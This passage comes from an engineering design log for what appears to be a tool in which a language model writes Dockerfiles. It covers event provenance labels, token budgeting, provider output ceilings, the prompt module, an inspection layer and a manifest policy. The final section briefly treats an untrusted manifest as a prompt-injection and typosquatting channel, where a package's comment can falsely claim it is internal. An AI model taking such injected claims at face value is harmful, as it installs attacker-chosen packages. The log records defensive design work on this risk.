trusted" one means ranking a model against a container, which has no honest answer.

The labels are declared per kind, so a kind's set is the union over every path that emits
it. `finished` is labelled `INPUT` because one of its five paths names the language the
caller asked for, though the other four do not. Coarse, and chosen: a table can be checked
and a label chosen at each emission cannot, and the point of a seam is that a second engine
has to honour it.

A fifth provenance was considered and refused. Docker's own words on `exec_failed` are the
daemon quoting the model's ENTRYPOINT, so the untrusted author is the model and the daemon
is not a separate one. `TOOL` exists and nothing emits it; the tool loop will.

The test that closes the loop reads `agent.py` with `ast` and asserts the kinds emitted
there are exactly the kinds declared. Construction covers one direction, a kind emitted
but never declared; this covers the other, a kind declared but never emitted. It asserts
each `Event(` call has a literal first argument, so a computed kind turns the check red
instead of quietly incomplete.

Nothing consumes the labels yet, which is the fair criticism of this piece. The answer is
that emission is the only place the answer exists, not that a consumer is imminent.

215 tests pass.

## The token budget
`envforge/budget.py`. The model spend is bounded in tokens, and `max_attempts` stays where
it is. Two currencies, two bounds: an attempt builds an image and runs a container, which
no count of tokens measures, while a count of attempts stops measuring the bill the moment
one attempt can take many turns.

A turn cap measures nothing on its own, because every turn resends everything before it.
The tool loop makes that sharp rather than theoretical: each file the model reads stays in the
conversation for every turn after it.

Part of the total is reserved and cannot be spent on looking around. `can_investigate`
asks with the reserve held back, `can_write` asks without it, and the gap between them is
the whole idea: investigation is worth nothing if there is not enough left afterwards to
turn it into a Dockerfile. Nothing calls `can_investigate` until the tool loop lands. It is here now
because a tool loop written against a turn counter is a rewrite later rather than an
argument, which is the test every one of the five shapes had to pass.

A spent budget fell back to the Dockerfile we write ourselves, exactly like a second
refusal. That changed on 30 August, below: it now ends the run, because a verdict no
judgment went into should not be reported as a success.

The estimate gates and the provider's numbers record. `estimate` errs high twice over, a
characters-per-token rate below the real one and a reply assumed to run to the output
ceiling, so the loop stops one call early rather than one call late. An overestimate is
never written into the ledger and refunded, because that pessimism compounds until the
budget is a turn cap wearing a different name. The ceiling half was an Anthropic truth only
when this was written, and stopped being one on 30 August, below.

`Budget` is frozen and holds no counters, so an `Agent` built once and run twice starts
each run at zero. A budget carrying its own spent total would let the first run quietly
bound the second, and a test drives the same agent twice to hold that.

## The tokens nobody was charging for, found before this piece merged
The budget was written first and reviewed before the loop used it, and the review found
that it could not bound anything. `Refused`, `Truncated` and `InvalidArguments` all raise
out of `llm.py` before any usage is recorded, so a reply we could not use cost tokens that
the ledger never saw.

Truncation is the case that matters. A truncated reply consumed the entire output ceiling,
which is what truncation means, so it is the most expensive reply there is and it was the
one charged at zero. A loop that kept truncating would have walked past the budget
forever.

`LLMError` now carries `input_tokens` and `output_tokens`, every raise site in both
providers reads the usage off the response it already has, and `validate` failures are
charged through a small wrapper because `validate` itself knows nothing about tokens. Zero
remains the default and now means one thing only: no reply reached us to read a usage off.

This does not reopen the trace deferral. That one is about keeping raw request and
response bodies for failed replies, which needs error types that retain wire data. Two
integers are not that.

## The bound that only bound one provider, 2026-08-30
A clean-context review of the branch found that `OpenAICompatLLM` sent no output ceiling.
Anthropic was sent `max_tokens` and the other two were sent nothing, while `estimate` added
`MAX_TOKENS` to every guess on the assumption that a reply cannot exceed it.

So on two providers out of three the assumption was simply false. One reply could run past
the whole budget before `can_write` got the chance to refuse the next call, and `Truncated`
had nothing to fire on, since truncation is the provider enforcing a ceiling we never sent.
The budget read as a bound and was one only under Anthropic.

Both OpenAI-compatible providers are now sent `max_completion_tokens`, which Groq's own
reference and OpenAI both document as the replacement for the deprecated `max_tokens`, and
which OpenAI's newer models require. A test asserts the ceiling is in the request for both,
and asserts the deprecated name is absent.

The lesson is the one this file keeps recording. The gap was disclosed honestly in three
places, ADR-015, the `budget.py` header and the entry above, and every one of them called
it a known gap in the estimate. None of them said the bound itself did not hold, which is
the sentence that would have made someone fix it.

232 tests pass.

## Prompts move to a module, decided 2026-08-25
Before the tool loop, and as `envforge/prompts.py` rather than as text files.

The reason is not tidiness and is not tool descriptions. A tool description is glued to its
JSON schema and the schema is code, so they change as a unit and stay together. The reason
is the failure this stage produced three times: the `/app` trap, the `--upgrade pip`
reflex and the missing `-y` were all the prompt describing the gate by hand while nobody
consulted the gate.

A module can import `INSTRUCTIONS`, `RUN_COMMANDS` and `RUN_FLAGS` and render the prompt's
lists from the gate's own constants, so that class of drift becomes impossible rather than
repeatedly fixed. A text file cannot. The limit is worth stating: derivation covers the
lists. The prose rules, the exec-form explanation and the `-y` build-time fact can still
drift, and nothing mechanical prevents it.

It must be a separate module rather than code inside `agent.py`, because `agent.py`
deliberately does not import `gate.py`: the `Gate` Protocol is local and the concrete gate
arrives as a constructor argument. `prompts.py` imports the gate constants and hands
`agent.py` finished strings, and the seam survives.

Deviation from CLAUDE.md, named rather than smuggled: it says prompts live as files
parameterised by language. This is one module and no per-language split, because nothing is
per-language yet. The gate is language-agnostic and the only per-language facts already
live in `LANGUAGES`. A split now is scaffolding for a tenant who has not arrived.

## The deterministic inspection layer, decided 2026-08-25
Proposed and accepted, closing the observability gap without the second model call Ben's design
uses. Accepted with two corrections.

It is a different thing rather than the same thing in a costume. Ben's intermediate is a
decision made visible, and its flaw is that the decision binds the step with more context.
This is evidence made visible, and evidence binds nothing. It is also the artifact the
trace's provenance field wants: records whose author is us.

The correction that matters: the proposal bundles two diffs of very different quality.
Manifest against the Dockerfile is sound, because both sides are package names, needs PEP
503 canonicalisation so `Flask` and `flask` do not read as a conflict, and is built first.
Imports against the manifest is not sound and never can be, because `cv2` and
`opencv-python-headless` are one dependency wearing two names. That half is two unmatched
lists a reader pairs by eye, and the word "conflict" never appears on it. A record that
calls an unmatched name a conflict is a record that lies, and it is the record an
interviewer asks to see.

The record is held back, never injected into the prompt. The strongest reason is not that
injecting recreates Ben's early binding, though it does. It is that a diff computed against
data we handed the model measures compliance rather than competence: agreement with a list
it never saw is evidence, and agreement with a list we gave it is nothing. Two more: our
list is incomplete by construction, since dynamic imports are exactly where `ast` fails, so
an anchored model gets worse precisely where reading beats parsing. And the tool loop's exit
ticket is a run where the model's investigation changed the outcome, which stops being
attributable to the tools if a digest was injected.

`ast.parse` executes nothing, the input is already bounded at 64KB by the workspace, and a
parse failure is data rather than an error path. Walk the whole tree rather than the top
level, since function-local imports are syntactically visible, and filter the standard
library or every `import os` becomes noise. The honest claim is "import statements present
in the source", never "what the script needs".

The bonus nobody was looking for: an unparseable `.py` is a deterministic witness for the
mislabel gap recorded above, catching a bash script labelled python at ingestion rather
than after a container run is spent on it. Whether that refuses or merely records will be
decided on real cases rather than in advance.

Not to be built, written down because the machinery makes it tempting: once a deterministic
manifest parser exists, a model-free fallback transcribing manifest lines into installs is
one afternoon away. Today's fallback installs nothing, so a refusal degrades a run. A
transcribing fallback would install attacker-named packages with no model involved, turning
refusal from degrade into escalate.

## Manifest policy, decided 2026-08-25 before any of it is built
The tools exist for one reason worth stating plainly: an import name is not a package name.
`import cv2` needs `opencv-python-headless`, and no amount of reading the script reveals
that while a `requirements.txt` states it. That single case is what makes the tools
load-bearing rather than decorative, and a run where the manifest changed the outcome is
the demo that work has to produce.

What a manifest is here. It sits beside the script, we never write it, a developer did, so
it is untrusted text exactly like the script. It is optional: only the script is required
and a run without a manifest proceeds normally. Our product remains the Dockerfile, so a
dependency the manifest states is expressed as a `RUN ["pip", "install", ...]` line rather
than by copying the file.

**One model call, not two.** Ben's project has an `identify_technologies` node producing a
base image and package lists before a separate node writes the Dockerfile. We keep one
call.

The reason has to be stated correctly, because the first version of it was wrong. It is
not that an intermediate summary discards information: his `generate_dockerfile` receives
the full script content alongside the identified packages, so nothing is lost. What
actually happens is that a decision is made early and then made binding. That node's system
prompt says "Use the provided base image", so a wrong identification cannot be corrected by
the step that has more context, and the `reasoning` field explaining the choice is dropped
from state entirely. Verified by reading `identify_technologies.py` and
`generate_dockerfile.py` rather than inferred from the graph.

The tool loop makes the question mostly moot anyway, because the model reads the manifest
instead of inferring from imports, which is a fact rather than a conclusion.

**When the manifest and the model disagree, the file wins.** Not because the file is more
trustworthy: it is the same untrusted text. Because somebody wrote it deliberately for this
project while the model is generalising from other projects, and explicit intent beats a
guess.

The exception is an import in the script with no corresponding line in the manifest. The
model adds it, because the file is silent rather than contradictory.

Every conflict is recorded and reported: the file said X, the model wanted Y, X was
installed. That record is also the evidence that the tools changed an outcome, which is
exactly what an interviewer will ask to see.

**A package the model believes is malicious does not stop anything.** It is written into
the report, shown to the user, and gates nothing, which is the same shape as the refusal
policy above.

Two reasons rather than one. The manifest is attacker-controlled text entering a prompt, so
a malicious package can arrive with a comment claiming it is an internal library. And
typosquatting is invisible to a well-intentioned model: `reqeusts` looks like nothing at
all.

What actually holds instead is already built. The gate refuses URLs, git references, local
paths and `--index-url`, so a package can only arrive by name from the default index.
Beyond that, containment is the container, which is the `pip install` argument in general,
and the real fix is the offline install after pre-resolution recorded in LATER.

